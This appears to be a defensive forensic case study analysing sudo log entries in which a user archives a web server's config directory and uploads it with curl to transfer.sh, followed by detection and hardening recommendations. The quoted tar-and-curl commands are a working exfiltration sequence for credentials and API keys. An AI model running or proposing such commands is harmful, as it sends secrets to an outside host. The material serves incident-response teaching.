# 🚨 Case Study 05: Data Exfiltration Detection — Unauthorized Archive Transfer

## 📝 Scenario Overview
During a proactive review of **sudo execution logs**, a highly suspicious sequence of commands was identified. A user archived sensitive configuration directories and immediately attempted to transfer the resulting file to an external public file-sharing service. This investigation focuses on identifying the intent and the specific data compromised.

---

## 🛠️ Tech Stack & Tools
| Component | Details |
| :--- | :--- |
| **Analysis OS** | Linux (Log Analysis) |
| **Tools Used** | tar, curl, grep |
| **Evidence Source** | /var/log/auth.log |
| **Security Focus** | Data Exfiltration & Insider Threat |

---

## 📑 2. Evidence (Raw Logs)
Critical commands identified during the forensic review of the user's session:

> **Timestamp:** Feb 16 19:05:01  
> **Source:** srv-web sudo: developer  
> **Command:** `/usr/bin/tar -czf /tmp/backup_site.tar.gz /var/www/html/config/`
>
> **Timestamp:** Feb 16 19:06:10  
> **Source:** srv-web sudo: developer  
> **Command:** `/usr/bin/curl -F "file=@/tmp/backup_site.tar.gz" http://transfer.sh/`

---

## 🔍 Technical Analysis & Investigation

### **Phase 1: Suspicious Archiving Observation** 📦
The user `developer` created a compressed archive of the `/var/www/html/config/` directory.
* **Analysis:** This directory typically contains critical assets: database credentials, API keys, and environment variables (`.env`).
* **Verdict:** Staging a compressed archive in the `/tmp` directory is a textbook indicator of preparation for data exfiltration.

### **Phase 2: Unauthorized Data Transfer** 🚀
The user utilized the `curl` utility to upload the staged archive to **transfer.sh** (a public anonymous file-sharing platform).
* **Analysis:** The commands were executed via `sudo`, bypassing standard user-level restrictions and logging the activity at a higher privilege level.
* **Verdict:** This is a confirmed case of **Data Exfiltration**. An attacker (or malicious insider) leveraged external web services to bypass internal network restrictions and steal sensitive configuration data.

---

## 🛡️ Security Recommendations

* **DLP (Data Loss Prevention):** Implement monitoring and automated alerting for large file uploads or POST requests to known file-sharing domains (e.g., transfer.sh, mega.nz).
* **Endpoint Control:** Restrict the execution of powerful networking tools like `curl`, `wget`, and `nc` for non-administrative users.
* **Privilege Management:** Audit the `sudoers` configuration. Developers should not have the ability to run archiving or network-transfer utilities with root privileges without a documented business justification.

---

**Status:** 🔴 High Alert | **Severity:** Critical | **Focus:** Data Protection
